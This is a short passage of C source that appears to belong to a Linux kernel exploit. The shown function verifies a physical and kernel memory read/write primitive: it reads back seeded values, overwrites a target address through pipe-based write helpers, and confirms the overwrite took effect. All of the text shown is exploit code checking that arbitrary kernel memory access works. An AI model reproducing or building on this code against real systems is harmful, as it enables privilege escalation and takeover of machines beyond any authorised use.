  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  kernel_read_data(
      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}
